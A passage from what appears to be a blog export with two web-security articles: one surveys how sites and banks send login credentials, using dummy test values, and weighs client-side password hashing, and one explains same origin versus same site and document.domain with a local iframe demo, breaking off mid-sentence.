https://cloud.tenable.com/sessionRequest Content: &#123;&quot;username&quot;:&quot;test&quot;,&quot;password&quot;:&quot;1234&quot;&#125; ProtonThis may not be a cybersecurity company, but I suddenly became curious about how privacy-focused Proton does it, and I found that it seems quite complicated. When logging in, the username is sent first, and some things that look like keys are obtained. API URL: https://account.proton.me/api/auth/info &#123;&quot;Username&quot;:&quot;test@test.com&quot;&#125; &#123; &quot;Code&quot;:1000, &quot;Modulus&quot;:&quot;-----BEGIN PGP SIGNED MESSAGE-----\\nHash: SHA256\\n\\nu9K5yr97L9VV2ijOSI62tJcewUiRhQa8qJa24baNpGyw0lf3JLiF4fxUHqTErwF9UdoxE0z4Kb147naphylBFddyKsjhzHNcxk2rBw9haiPxD69BrVYm0n+LVlPqmjXFF7btr1H7oqHGX4b4Dy9omL&#x2F;KaZz&#x2F;Dco2NEhw0UBhEZbTAs6Ch01ur9XLbSOI7yb6MRsqCehfy82gDTdbPtXvqQsQjg5XoC2Ib2qTYFaU&#x2F;24mq&#x2F;gOaMbVuAGX0hBYzr5NpN9ol2XCdHOLg28Xe90+kisg39VV04axy7Ndvh489dC1CxjcWSSpXd6cPJyOn&#x2F;HH9aPeTZeucBllRGbPgwR6&#x2F;w&#x3D;&#x3D;\\n-----BEGIN PGP SIGNATURE-----\\nVersion: ProtonMail\\nComment: https:&#x2F;&#x2F;protonmail.com\\n\\nwl4EARYIABAFAlwB1j0JEDUFhcTpUY8mAAD1GwEAoC91QCSfXPEuWM13NZvy\\nvL9NQIABuSrVOvgJwMhUTnUBAPb4zbIdTYFOQNrPLvonJt2mmRNy4lGcW7uN\\n5yHzJ18J\\n&#x3D;Oykn\\n-----END PGP SIGNATURE-----\\n&quot;, &quot;ServerEphemeral&quot;:&quot;DY6eRYM1bqYZZ5jzZFdWv88tKYP2PnS0y4A+f7&#x2F;eqMXj8wB2VefV2kfIDrZ5AorWfDzBq4wMtNG2k5dzbT2qWppzpvltrSl2Nm4i8eWIRVxXWHl&#x2F;46dGuPXFHUcXBNMP3XEQvft0YEbHOPO9Es0RZRaObV5XPFyx6kzOJxXc1tIt4PfbhODMfsAoy&#x2F;yxt6eLN3HUiORCBOvzsH2sfG99Gx1YSAe3GL6g&#x2F;K+bdg59eglueXRESoB0&#x2F;VFRsvQevi9nVXx&#x2F;JZNTG0U4BBUOlMjpYYMgEP6eQgZZ&#x2F;09ZPYD3a2tW65mSnNt6lSDfwiKj02UuDqymTvj7mYm44T0SuAocwg&#x3D;&#x3D;&quot;, &quot;Version&quot;:4, &quot;Salt&quot;:&quot;dI7OcD+K4rGPBA&#x3D;&#x3D;&quot;, &quot;SRPSession&quot;:&quot;3fa6224285409b6af07c811971e05341&quot; &#125; Then, when entering the password to log in, a request like the following is sent, which also looks quite complicated: &#123; &quot;ClientProof&quot;:&quot;I9Nfd0Nd3OzODf2nt9zLxFHWogEwfRje8zjoeZnblyLfyzz23uXTjJ4qgRFomjIEEtZrlM1jTQa4wRIMGIIV7E6pMqq8c6wcc2tegP4Xt76S0EbnVtE1F9i0Wj46aCPUM0Mha3Zmgi9LKerrGlaftr2FBedjPFT9rPrbLqRQcFNMD33tn69gD&#x2F;p28q4RAr3&#x2F;7d&#x2F;tz7TYhytD5oxCAUwrkqiZOi0kg&#x2F;&#x2F;2mUJ9YNT2nWcgqUERoaU51NbNMcaPnMteEe1PlIJdiQbvNa5K07u8rk7itpBrGW2FP26bREp0UMTzNYM5HcDDkmp4dp9GoBjFJL9n0THUdt&#x2F;oRRJ&#x2F;Enj5WQ&#x3D;&#x3D;&quot;, &quot;ClientEphemeral&quot;:&quot;D013N7FXYHylqMeWa6ctJIv3J4uF1hqodyYfw6O+Sj7MZOIB+wksfgk&#x2F;nkXCmRxQhuSYwqwMJIpyFD3MEolOZAHMU2n6HQlxe9A4KbrE4gk3UiGwfgcZDmFejTmMMxfWhf4zO2Z1fBbohreqwwN0mz3AqqsfE5dsDh3LEfkiJB449YGZfHeUHyIzS1jTmnx&#x2F;8l6uVSKwJDCJelVFYKMXrxVt0ltcGRoYD92MUj82kR0am+BN4+djHyYYXuwuIYArnTW4kDP3T2yCIAMVgZnFaUCc2gfynt40mQP4q87jmMELOl8TDIDo5iKyH4gJc&#x2F;470qIuIyj4ffVLiZ7t8S+kcw&#x3D;&#x3D;&quot;, &quot;SRPSession&quot;:&quot;3fa6224285409b6af07c811971e05341&quot;, &quot;Username&quot;:&quot;test@test.com&quot;, &quot;Payload&quot;:&#123; &quot;qcA_CRYU6gSyHWdn&quot;:&quot;c6UZSKPo4Sfm&#x2F;3+DvQN72TTxyj+&#x2F;TplKT9edDiUI5wMfGUsoJs9FGerOtkoW8T49r7KOvqHkzS2+M2v8ra7J9l5kSf5jgC9ZvgZ8Ja5Xgg02nxgAABydOirGLoL4htFsYVtwLrNg8NeSEanLwYLCVaSqkjANRJks0eaKpUOd8xRhCFtUH&#x2F;GCbyg27oZfzDsqKXemKprOUsOh42NTqzEmruAkxs2x8mUsLy&#x2F;vXptVAdaiJLrsSRqD0YBGjvOp4W2&#x2F;0g6V2zfedJpJEzVwtSi1vXTC5bwxmEJlYdV9AiQECogAAJFxLQi7JjtmgFe4tNcv97JD0B8giZ6XS35swjz0vz0mOjVBUwmiDa8n54Y5kBaAoZe5pijdp2S4SOcRAknDIcD1nf0v7oSMOE9WtH&#x2F;sa+XI1D2s5lFKo&#x2F;iInf7r5R9src2hHFoy0b2XT0oCfLPwFX87yjaKbf7bbkjByx&#x2F;3dOgzEliAkS6nHK+fmeDDVM4EoZqVSKZHLg3QTcg4DKaICyDsotALr2UqI&#x2F;ARzkX4yhAXz5xHFaxl6hWAKLJPJcgk6il6oX0s0PCBNSY0Fi3vbQvXD4WalUx+LBNto6CUqeAIzVuAh8sCubzufoSORypE5WqfnuJzAlZ9sMEjaQycuRi497aV3jmjgx53UwO0OiZGxDTEMFBcov4P0g1blZ4vxmULhZU0RfdP31udLr6GTCAB90CM6Vk9w9CsYM+hmo3+JpEAtIVgLVVqcPikTbV+yaOJ1RknxBf3g06kTl0LQ+zBV6pG2rFVi8G4XT9L4FsIgxTNsl&#x2F;ryzs8vJU7K+HvyE1Lp2pAXrfcju7TAIqK&#x2F;FOXvp1c8Ay9O6d4fmd&#x2F;PZalnRDv5mQ6Gmd6JSNzNh6i6AibBuF13w3OBaulY3FGNU&#x2F;cH&#x2F;AXLBIqjSzf&#x2F;OySwkKkC9HBurSs3D0zqcH9BwUpmPEL8jbc8yPE+hPAim+tDo1BXCQNClxgGLaI6FXkuCiQ4AHiKsq0xs5b3WAFzcvBv1rc003RWxRegH&#x2F;2teIooKU9w1kDPQRaK8&#x2F;rIYe8u+BlBeZq4OwCXxx56JHfmTxtJwBi95KqsWzLGtY3ILcb+&#x2F;XkzSRmE2TWbkW1IXzRsl8F6NSJj7JnHA3UrQf4hxuwbaYxpKJrcHuHc8e1wxqXrUSKooCOUxwSBgxvLLT37eaByNTxpfWomxIsH671wuydnmMedWyNIqyaMtxBORuiWUiG4jbMC2BjrVptXJ7VWigf3Vy5OQlMOyTx8tLWi1qZODYyywMBAvHYQlFfSqmIrm4y4dmK&#x2F;srJE&#x2F;+daEnNS+kWF48Jm&#x2F;rQORO5AUwqWL+Lefg9pchcL1BnHOANcviO8pAkxLo8TiK7VLKI5&#x2F;xUsZQoQSlhRt27zMF+sIv+exY375HApiY+a1VQ6OqE4Nvba7O8ETLoLFg4a8Aj+W8erXFHW5F0vVIRphAve9orM4QYnAmOigFAiLb0Pxx124wUjFR9s5oP98hAtNL&#x2F;t+uGAXrb0oxiCfyHb9wa2Qb0x6o9FpuBIc5ZXId+cEXEvOdqhnUQ7ZuOi&#x2F;fX81hlqgUaiD&#x2F;A6P+zjAcREXdktd+hrhSXwCIKSBkp&#x2F;mNymnalQKJkLaNVT+W2sOWqXxTSTIytCQx36xABcj1BXRApntob6Qvche8QJLTjzr9bDpn+Mo59N9PSU51DPIj5Avre6ChTHEQvjz9s1IM2XroBX&#x2F;KFBnPj33aYQZyov4uxrVXxic+fiY+fLMF8x1ut&#x2F;eNWeQU6fn+rU5PEGQ9bbAsjVBZYA5H93ROhO5lnSxoEk5PHkgQ9WpxueckPjJIUGAs+O8QMRFicccfKjhNIc32rXTqbVqLyoz62riDn8Y18MUBoeI8ORyqZOKEEBFsi5dwqoq8t82NFdx5LFjsLdk4RmMXZ2uygNLk8gH2Yyfu3iOQS2bKtNCW42Xmo66Xu5kt8NwAneYQK0mTn6HUv94K10J4hY+Q&#x3D;&quot; &#125; &#125; Supplement: After being reminded by someone in the discussion thread, I found out that this is a protocol called SRP (Secure Remote Password), and Proton provides a ProtonMail Security Features and Infrastructure, which records their security measures and mentions this mechanism. It looks quite complicated and will take some time to study. For those interested, you can refer to: SRP — A More Robust Login and Data Transmission Protection Protocol Although it is more secure, the cost should be higher. Exchanges and BanksAfter reading the above cases, I found that only a few have implemented it, so I was curious whether encryption-focused cryptocurrency exchanges and traditional banks have implemented it. BinanceAPI URL: https://accounts.binance.com/bapi/accounts/v2/public/authcenter/login Request Content: &#123; \"email\":\"test@test.com\", \"password\":\"fe2e6b4138fcd7f27a32bc9af557d69a\", \"safePassword\":\"d404559f602eab6fd602ac7680dacbfaadd13630335e951f097af3900e9de176b6db28512f2e000b9d04fba5133e8b1c6e8df59db3a8ab9d60be4b97cc9e81db\" &#125; CoinbaseAPI URL: https://login.coinbase.com/api/v1/authenticate-credentials Request Body: &#123;\"email\":\"test@test.com\", \"password\":\"1234\"&#125; KrakenAPI URL: https://www.kraken.com/api/internal/account/settings/tfa Request Body: &#123;\"username\":\"test\", \"password\":\"1234\"&#125; Esun BankAPI URL: https://ebank.esunbank.com.tw/fco/fco08001/FCO08001_Home.faces Request Body: loginform:custid&#x3D;A0000... loginform:name&#x3D;mxagZmaqygDx0XX6784Svw&#x3D;&#x3D;__NgZQcFfAx+lQmPza2eNpOA&#x3D;&#x3D; loginform:pxsswd&#x3D;8,lIRnuUxw&#x2F;yStOt9QIYG2U3Gn2XkG03x4Ey&#x2F;UU6JGtsbUxfRXoAv9CjE3EWerDN3tfx3dD&#x2F;B3ChLAPMSG2BA3jMXUCZC06y8UbQ5isKc9fCWZSSZAWWcOmJ7LdXw1ZhjV55hpw1upvAr9WEmZ0XF6x7if+dBxJ4KZ00d83qA9eA+3VaSk+JLhN8&#x2F;CFBfTKTfJEs3PDNsm12XzRUBb4YE1aPQosVX10mdvh3zY5lmkrKuq8gnuImEf3oLOk4EF3eVpr6jJiFzMKlHybvGdtKYS25+pgTS68wn3v023barbSmgivcv5atm0XsyXWDY2dKEtdQz+7A6R+AB0bExbQlRjqQ&#x3D;&#x3D; Cathay United BankAPI URL: https://www.cathaybk.com.tw/MyBank/Quicklinks/Home/NormalSignin Request Body: CustID&#x3D;A000... UserId&#x3D;DC0C6E52BE2A2354C53401207F220F1B Password&#x3D;8cf5e1977f149ed0362629007a7f91d0efc7b12cb1895ba701c528a12b38d12f8148ca03ee671fe25d2a3a807be980f7728566e359a675734ce046899b147658388bb60f9b900e2ccc9adac280b54b5f2e28cb7eee1b634d0e1ed1c0c0c598c350f61eb003405559331a7f047add7289466bf42cfd5b9e774a1fa116af4fd7050adb8f174d42a8e2098a014a788bd2ffae3bf4ff7a8d8d7e2e8068402fda395da41be6e5d32f2d32cbee2afc26e82c58b60357b5cb186a3b9cf69df2deb9da8c9fde45337935180cb4e177109413d7a758d38bfc8334a4509d8d8fb6a37080f0e0086b4a5ef68f7809ca2ef97183b7f66d996873bb7dbfcee61d2da424b8b968 CTBC BankAPI URL: https://www.ctbcbank.com/IB/api/adapters/IB_Adapter/resource/preLogin Request Body: &#123; &quot;rqData&quot;: &#123; &quot;custId&quot;: &quot;A00....&quot;, &quot;pin&quot;: &quot;878dbee38bbb4d77a30ee128f55f7bfe2169e45380d62a75453d3ca175e8ce8b|43d0499147b62adeec4eef3c77d33171b4569d0bdf7bbbe2b8b9bde3d30a26aba69aadfb28dfbaa9a997a0ccf668aaab0b6da582275175272172569a58a60bbfc5ac3a8c6862ce31f86247d7c1adf307e363c0f251fb88c4d39afa6ed0ca0a49e053f4f90000fa77b4e78beaead72ebdf52a13ecb4f20ae9a532947fad8156d5ec69d6763243364e71659079e469d1e01d0c384b0c71f4e9e524890227d82a51a340ef0b48638e05e347d75cb93d4a825a2bce6a90ef47f512351ee2d0d1ea17fb8afd521e427578603ea775191711f81d8dcb18e46b72daf3a49a60e50d12d3887e3bafab3758730f7fb0276373ebe1da01a03162ec8e73a202091a51b7f88d&quot;, &quot;userId&quot;: &quot;bfcdb9b2d6896a3bfb4a6542e8fb2689486d000b11bdc0c7bc336a6534aec74c|1b1a758bb26702bc0ac7cd660da2a72866f2cfdcf3668f2d39a5f8b006854f52a08f418b0a460b36374f95b7a310d73ea9994788698041f524ecd1f153448ab5d51f901a9a08ac2a9ee04c5c273ecb9d4ec1b6a62e9696c6126271e2f8c334fe17ce8b8538139363b90be75c1130cb251ec240bd26c920b52f5be9fc59094ce7d935d826242d69dc1ff7047a5abbf11d3c7de639a14bb10230912903cd948c05b3b3cb0cdb100f979640e291774e623a7109bde7b55bb8a6a373c0ca12820b072132ea61c845e60e26d09c7ee0fe23f7de286cbccb067a86fd1985c5b455f9ae46ce24dc8f52bcb05c205d6a462345162ae82c35e045bf3fd43a297c3edcfe17&quot; &#125; &#125; Bank of AmericaAPI URL: https://m.globalcard.bankofamerica.com/pkmslogin.form Request Body: username&#x3D;fcc63767-1a43-4cc6-8c3e-1346350b5274 password&#x3D;12345678 DBS Bank (Singapore)API URL: https://internet-banking.dbs.com.sg/IB/Welcome Request Body: USER_LOGON_NAME&#x3D;test123 ENCRYPTED_PIN_BLOCK&#x3D;A8C48B7572A1A53C5A66E9B43365027C7FBF14BF461F480A46781E49648A8F70271A29C374F86FCD55A76ED17B2284B47C799B74475F29749D68631FF7E322177A21EEE8C41D8950638A2828C34A2653D7C9F69F5DA568E42D64CE89FCE8F024217B235835E6F8BC3C536F56361EDF459AFCE9A512BDBACAB2D25423209996C2E84A18EA8446685DAF9FAD4B1D6D8DF0F378EC27D9A81AD4D1A2B91BA3CFD838140A9BD48AD8D38D33B0093110BD1CA2C76F3DE4CBD969A9B0260DB890E9B1A99DC1193BFE9A1EDB3E56F71CB1CD8630558B242B040F733A4A40B2E17DE6DA03A58DEC8BB12DA87BB25971E2DBE5AF7AE6112266A3F9027B449BDF46D8DC0A1A ConclusionOut of the 20 randomly selected websites, 7 of them implemented encryption or hashing on the client-side (I’m too lazy to check which ones, but they did something). The list includes: Facebook Proton Binance Esun Bank Cathay United Bank CTBC Bank DBS Bank (Singapore) Although 35% seems high, it’s mainly because banks make up the majority of the list. Most general websites do not implement this mechanism. In conclusion, the first conclusion is: “Encrypting or hashing passwords on the client-side before sending them can indeed increase security.” This is because it can achieve the following: When HTTPS fails for various reasons, attackers cannot obtain plaintext passwords. On the server-side, no one knows the user’s plaintext password. Plaintext passwords will not be recorded in logs due to human error. All of the above cannot be achieved without encrypting or hashing on the client-side. The second conclusion is: “Some large companies do implement this mechanism, but it is not the majority, although it seems to be mainstream in the banking industry.” The complete data is posted above. General websites rarely implement this mechanism, but some still do. The third conclusion is: “Although it can indeed increase security from a technical perspective, other factors still need to be considered when implementing it.” These factors are the “possibility” mentioned earlier and the “cost” mentioned at the beginning. If it is really more secure, why don’t general websites implement this mechanism? Perhaps because the possibility of HTTPS being compromised is too low to be considered (I believe this is the reason why most commenters think it is unnecessary, and I agree), or perhaps because the cost is too high and would increase code complexity. If an encryption scheme is used, it will also consume more computing resources for encryption and decryption, which is also a cost. This is where I think it should be made clear. Hashing or encrypting in the front-end does have advantages, it is not redundant, it is not meaningless, and it does not make the system more dangerous. But this does not mean that every system should implement this mechanism, because the benefits it brings may not outweigh the costs, which depends on the considerations of each company. For most companies, instead of investing in the low possibility of HTTPS failure, it is better to spend time strengthening the security of other login links (such as 2FA or login warnings on different devices), which will bring greater benefits. Some services will also choose to encrypt the entire request package, not just the password, which is even more secure but also more expensive and difficult to debug. Although it is true that since encryption is done on the client-side, attackers will definitely be able to reverse engineer this mechanism and figure out how it works, but this does not mean that these mechanisms are not helpful. For example, suppose I have a ticket-snatching app that doesn’t want others to know how to call the API, so I implemented a super complex encryption mechanism. Although experts can still reverse engineer and write a ticket-snatching robot, this mechanism increases their time and technical requirements. Technically speaking, even if it will definitely be cracked in theory, these mechanisms are still meaningful because they increase the difficulty of cracking. Obfuscation and encryption are the same, and these mechanisms should not be avoided just because “client-side things will definitely be seen through.” The key is whether the value of the business logic you want to protect is high enough for you to pay these costs to implement additional security mechanisms. Finally, if you need a simple summary in bullet points, it would be: In any case, HTTPS must be used first. Encrypt or hash the password in the front-end before sending it, which can increase security, but also comes with a lot of costs. If you are a bank or need equivalent security, then consider whether to do this. Otherwise, in most cases, you don’t need this mechanism to be secure enough, and investing resources in other areas will bring greater benefits. If you have different opinions on this conclusion, or if you find any logical or technical errors in the article, please feel free to leave a comment for correction and discussion. Thank you. To supplement, this article mostly looks at it from a technical perspective. In addition to this, it can also be viewed from the perspective of legal compliance or practical experience in information security, but I have zero experience in these areas. I hope someone with relevant experience can come out and give some guidance, which may have different opinions.","link":"/2023/01/10/en/security-of-encrypt-or-hash-password-in-client-side/"},{"title":"The Art of Turning Same Site into Same Origin!","text":"Although Same Site and Same Origin may seem similar, they are actually quite different. This difference affects how the browser perceives the relationship between these two websites and the permissions it grants. This article will cover the following topics: What is Origin? What makes it Same Origin? What is Site? What makes it Same Site? What is the difference between Same Origin and Same Site? How to turn Same Site into Same Origin? Without further ado, let’s get started! (Before we begin, let’s answer a question. Yes, the title was inspired by the ninja Hattori.) 2022-01-20: Modified the “Examining Same Site” section to supplement the history of the scheme. Thanks to @littlegoodjack. Exploring Origin and SiteLet’s start with a simple and easy-to-understand explanation, which is somewhat inaccurate, but we’ll correct it one by one later. Origin is the combination of scheme, port, and host. Therefore, the origin of a URL https://huli.tw/abc is: scheme: https port: 443 (the default port for https) host: huli.tw Thus, its origin is https://huli.tw. As you can see, the path /abc does not affect the origin, and the port part is already implied as 443 for https. Same Origin means that the origins of two URLs must be the same. For example: https://huli.tw/abc and https://huli.tw/hello/yo are Same Origin because their scheme, port, and host are the same, and the path does not affect the result. https://huli.tw and http://huli.tw are not Same Origin because their schemes are different. http://huli.tw and http://huli.tw:8080 are not Same Origin because their ports are different. https://huli.tw and https://blog.huli.tw are not Same Origin because their hosts are different. As you can see from the above examples, the conditions for Same Origin are quite strict. Basically, except for the path, everything else must be the same to be called Same Origin. Next, let’s take a look at Site. Site looks at fewer things than Origin, only scheme and host, so it doesn’t look at port. The definition of two URLs being Same Site is also more relaxed. The host part does not have to be exactly the same, as long as it is a subdomain, it is also considered Same Site. For example: https://huli.tw/abc and https://huli.tw/hello/yo are Same Site because their scheme and host are the same. https://huli.tw and http://huli.tw are not Same Site because their schemes are different. http://huli.tw and http://huli.tw:8080 are Same Site because the port does not affect the result. https://huli.tw and https://blog.huli.tw are Same Site because huli.tw and blog.huli.tw are both under the same domain huli.tw. https://abc.huli.tw and https://blog.huli.tw are also Same Site because abc.huli.tw and blog.huli.tw are both under the same domain huli.tw. Compared to Same Origin, Same Site is obviously more relaxed. Even if the ports are different, it is still Same Site, and as long as the host belongs to the same parent domain, it is basically Same Site. However, as I mentioned at the beginning, although the above definitions are correct in most cases, they are not precise. Let’s take a look at the spec to see what exceptions there are. Examining Same OriginIn the article CORS Complete Guide (Part 1): Why CORS Errors Occur?, I mentioned the definition of Origin. In the 7.5 Origin section of the HTML specification, you can see the complete definition. Let’s first take a look at the explanation of Origin in the specification: Origins are the fundamental currency of the web’s security model. Two actors in the web platform that share an origin are assumed to trust each other and to have the same authority. Actors with differing origins are considered potentially hostile versus each other, and are isolated from each other to varying degrees. This passage explains that if two websites share the same origin, they trust each other and have the same authority. If they have different origins, they are considered potentially hostile and are isolated from each other to varying degrees. The specification divides origins into two types: “An opaque origin” and “A tuple origin”. Opaque origins are special cases that occur in certain situations, such as when a web page is opened locally and the URL is “file:&#x2F;&#x2F;&#x2F;…”. In this case, the origin is an opaque origin, which is “null”. Tuple origins are more common and are of greater concern. The document states that a tuple contains: Scheme (an ASCII string). Host (a host). Port (null or a 16-bit unsigned integer). Domain (null or a domain). Null unless stated otherwise. You may wonder why there is both a host and a domain. We will discuss this later. The specification also includes an algorithm for determining whether two origins, A and B, are the same origin: If A and B are the same opaque origin, then return true. If A and B are both tuple origins and their schemes, hosts, and port are identical, then return true. Return false. Either the two are the same opaque origin, or their schemes, hosts, and ports are all the same to be the same origin. In addition to the same origin, you will also see the term “same origin-domain” in the spec, which we will discuss later. As I mentioned earlier, the same origin is a strict restriction. For example, for the URL “https://huli.tw/api“, because the origin does not include the path, its origin will be “https://huli.tw“. This means that the URLs of websites that share the same origin must all be “https://huli.tw/*” to be considered the same origin. Although “https://huli.tw“ and “https://blog.huli.tw“ are only related to domain and subdomain, they are not the same origin because the hosts are different. Remember this, it is important. The definition of origin and same origin explored here, as well as the “inaccurate statement” mentioned at the beginning, differ in that there is an opaque origin and same origin-domain, and the origin tuple includes a “domain” that we did not use. Finally, one more thing to note is that when I say “‘https://huli.tw/api‘ has an origin of ‘https://huli.tw‘“, a more accurate statement is: “‘https://huli.tw/api‘ serialized its origin as ‘https://huli.tw‘“. This is because the origin is actually a tuple, which is represented as follows: “(https, huli.tw, null, null)”. The tuple becomes a string, which is “https://huli.tw“. When the information represented by both the tuple and the serialized string is similar, I prefer to use the latter method. Examining SameSiteThe definition of site is also in the same spec, which states: A site is an opaque origin or a scheme-and-host. Therefore, a site can be an opaque origin or a scheme-and-host. In the spec, we can find another term called “schemelessly same site” in addition to same site, and the difference between the two is also very clear. Same site considers the scheme, while schemelessly same site does not. Therefore, the algorithm for determining whether two origins A and B are same site is as follows: Two origins, A and B, are said to be same site if both of the following statements are true: A and B are schemelessly same site A and B are either both opaque origins, or both tuple origins with the same scheme If A and B are same site, either they are both opaque origins, or both have the same scheme and are schemelessly same site. So same site considers the scheme, and two URLs with different schemes like http and https will never be same site, but they may be schemelessly same site. There is actually a small historical context here. When same site was first introduced, it did not consider the scheme, and it was not until later that the scheme was included in the consideration. In this 2016 RFC: Same-site Cookies, you can see that the judgment of same site did not include the scheme, so at that time, https://huli.tw and http://huli.tw were same site. It wasn’t until June 2019 that the discussion began on whether to include the scheme in the consideration. For more details, please refer to: Treat http://foo.com -&gt; https://foo.com requests as Sec-Fetch-Site: cross-site. #34. At that time, the spec for same site was not defined in the HTML spec we see today, but in another URL spec, so the discussion was moved there: Consider introducing a “same-site” concept that includes scheme. #448, and then in September 2019, this PR was created: Tighten ‘same site’ checks to include ‘scheme’. #449, which officially included the scheme in the consideration in the specification, defining same site as “considering the scheme”, while a new term was introduced for not considering the scheme: schemelessly same site. Then, two months later, the relevant spec was moved from URL to HTML. Please refer to these two PRs: Let HTML handle the “same site” definition #457, Define (schemelessly) same site for origins #5076. Spec is spec, and sometimes specification revisions do not mean that browsers will immediately follow suit. So what is the current implementation of browsers? In November 2020, Chrome wrote an article: Schemeful Same-Site, which seems to still consider different schemes as same site at that time, but from Chrome platform status: Feature: Schemeful same-site, we can see that Chrome has included the scheme in the consideration since version 89. As for Firefox, from the status of this issue: [meta] Enable cookie sameSite schemeful, it seems that it has not yet considered this behavior as the default value, and if there is no special setting adjustment, different schemes will also be considered as same site. After reviewing the history, let’s take a look at how the most important schemelessly same site is determined: We won’t discuss the opaque part for now. The key point above is obviously a new term: “registrable domain,” which is used to compare two hosts when determining if they are the same site. The definition of this registrable domain is in another URL spec: A host’s registrable domain is a domain formed by the most specific public suffix, along with the domain label immediately preceding it, if any. Here, another new term is mentioned: “public suffix,” which we discussed in the DoS attack using Cookie features: Cookie Bomb post. An example will make it easier to understand. The registrable domain of blog.huli.tw is huli.tw, and the registrable domain of huli.tw is also huli.tw. However, the registrable domain of bob.github.io is not github.io, but bob.github.io. Why is that? I’ll explain briefly below. If there were no concepts of “registrable domain” and “public suffix,” then the definition of same site would be what we mentioned earlier: huli.tw and blog.huli.tw are the same site, which is not a problem. But if that were the case, bob.github.io and alice.github.io would also be the same site. Wait, isn’t that bad? Yes, because github.io is a service of GitHub pages, and every GitHub user has their own subdomain to use. But GitHub doesn’t want bob.github.io to interfere with alice.github.io because they are actually two completely independent websites, unlike huli.tw and blog.huli.tw, which are both owned by me. Therefore, the concept of public suffix was introduced, which is a manually maintained list of “lists that do not want to be treated as the same website.” I’ll give a few examples: github.io com.tw s3.amazonaws.com azurestaticapps.net herokuapp.com So after the browser refers to this list, it will recognize that bob.github.io and alice.github.io are not related and are not the same site. This also has a proprietary term called eTLD, which can be found in detail in How to determine if two domains have the same owner? As mentioned above, because github.io is in the public suffix list, the registrable domain of bob.github.io is bob.github.io, while the registrable domain of alice.github.io is alice.github.io. So, the definition of same site we mentioned at the beginning is not correct. Two hosts that appear to belong to the same parent domain do not necessarily mean they are the same site. It also depends on whether they are in the public suffix list. blog.huli.tw, huli.tw, and test.huli.tw are all the same site because their registrable domains are all huli.tw. The spec also includes a clearer table, which you can take a closer look at: Finally, let’s summarize same site: There are same site and schemelessly same site, and the former is more commonly used. To determine if two hosts are same site, you need to look at the registrable domain. To decide what the registrable domain is, you need to look at the public suffix list. Even if two hosts appear to belong to the same parent domain, they may not be same site due to the existence of public suffix. Same site does not consider port, so http://blog.huli.tw:8888 and http://huli.tw are same site. Same origin and same siteSame origin looks at: Scheme Port Host While same site looks at: Scheme Host (registrable domain) If two websites are same origin, then they must be same site because the criteria for judging same origin is stricter. The biggest difference between the two is: Same origin looks at port, while same site does not. Same origin looks at host, while same site looks at registrable domain. Here are some examples: A B Same origin Same site Description http://huli.tw:8080 http://huli.tw X O Same site does not consider port https://blog.huli.tw https://huli.tw X O Same registrable domain https://alice.github.io https://github.io X X github.io is in the public suffix https://a.alice.github.io https://b.alice.github.io X O Same registrable domain https://bob.github.io/page1 https://bob.github.io/about O O Regardless of path The magical document.domainAfter discussing same origin and same site, we finally come to the topic we wanted to talk about at the beginning, which is the “domain” attribute mentioned in the origin spec. There is even a “same origin-domain” thing in the origin spec. In fact, there is a green note in the origin spec that directly breaks the topic: It says that except for the domain attribute, everything else in the origin is immutable, and this attribute can be changed through document.domain. There is a section in the spec called 7.5.2 Relaxing the same-origin restriction, which talks about this. Here is an excerpt: (document.domain) can be set to a value that removes subdomains, to change the origin’s domain to allow pages on other subdomains of the same domain (if they do the same thing) to access each other. This enables pages on different hosts of a domain to synchronously access each other’s DOMs. For the convenience of understanding, let’s start with a demo. I modified the contents of /etc/hosts on my local machine as follows: 127.0.0.1 alice.example.com 127.0.0.1 bob.example.com In this way, both of these URLs will connect to the local server. Then I started a simple HTTP server and wrote a simple HTML to run on localhost:5555. &lt;!DOCTYPE html> &lt;html> &lt;head> &lt;meta charset=\"utf-8\" /> &lt;meta name=\"viewport\" content =\"width=device-width, initial-scale=1\" /> &lt;/head> &lt;body> &lt;h1>&lt;/h1> &lt;h2>&lt;/h2> &lt;button onclick=\"load('alice')\">load alice iframe&lt;/button> &lt;button onclick=\"load('bob')\">load bob iframe&lt;/button> &lt;button onclick=\"access()\">access iframe content&lt;/button> &lt;button onclick=\"update()\">update domain&lt;/button> &lt;br> &lt;br> &lt;/body> &lt;script> const name = document.domain.replace('.example.com', '') document.querySelector('h1').innerText = name document.querySelector('h2').innerText = Math.random() function load(name) &#123; const iframe = document.createElement('iframe') iframe.src = 'http://' + name + '.example.com:5555' document.body.appendChild(iframe) &#125; function access() &#123; const win = document.querySelector('iframe').contentWindow alert('secret:' + win.document.querySelector('h2').innerText) &#125; function update() &#123; document.domain = 'example.com' &#125; &lt;/script> &lt;/html> There are three functions on the page: Load iframe Read data from the iframe’s DOM Change document.domain First, we open http://alice.example.com:5555, then load the iframe from http://bob.example.com:5555, and then click “access iframe content” on the alice page: You will see an error message in the console that says: Uncaught DOMException: Blocked a frame with origin “http://alice.example.com:5555“ from accessing a cross-origin frame. Because although alice and bob are same site, they are not same origin. If an iframe wants to access the content of the DOM, it must be same origin. Then we both click “update domain” on the alice and bob pages, and then click “access iframe content” again: This time, you will see that we also obtained the data from the bob page, and successfully changed http://alice.example.com:5555 and http://bob.example.com:5555 from cross origin to same origin. This is the art of patience, turning same site into same origin! This trick is not available for any two web pages. Basically, only same site websites can use it, and there are many checks when setting it up: Taking github.io as an example, if alice.github.io executes document.domain = &#39;github.io&#39;, an error will be thrown in the console: Uncaught DOMException: Failed to set the ‘domain’ property on ‘Document’: ‘github.io’ is a top-level domain. Why do the two pages become same origin after changing document.domain? Strictly speaking, it is not same origin, but same origin-domain. In the docuemnt related spec, it is written that some checks are based on same origin-domain, not same origin. So how do we determine if two origins are same origin-domain? Let’s take a look at how the spec says: If A and B are the same opaque origin, then return true. If A and B are both tuple origins, run these substeps: If A and B’s schemes are identical, and their domains are identical and non-null, then return true. Otherwise, if A and B are same origin and their domains are identical and null, then return true. Return false. If the schemes of A and B are the same, and their domain properties are the same and not null, return true. Otherwise, if A and B are same origin and their domains are identical and null, return true. Here are some interesting points: Both web pages must either not have a domain set or have the same domain set in order to return true (this is important). If a domain is set, the same origin-domain no longer checks the port. document.domain is used to change the domain attribute in the origin tuple. In the example above, both web pages http://alice.example.com:5555 and http://bob.example.com:5555 changed their domain to example.com, so they have the same origin-domain. Let’s take a look at three interesting cases below. Case 1: One-sided changeIf https://alice.example.com executes document.domain = &#39;example.com&#39; and then embeds https://example.com in an iframe, they are still not the same origin-domain because the alice page has a domain attribute, but the example.com page does not. example.com must also execute document.domain = &#39;example.com&#39; for both to be the same origin-domain. Case 2: Disappearing porthttp://alice.example.com:1234 and http://alice.example.com:4567 are cross-origin because the ports are different, but if both pages execute document.domain = 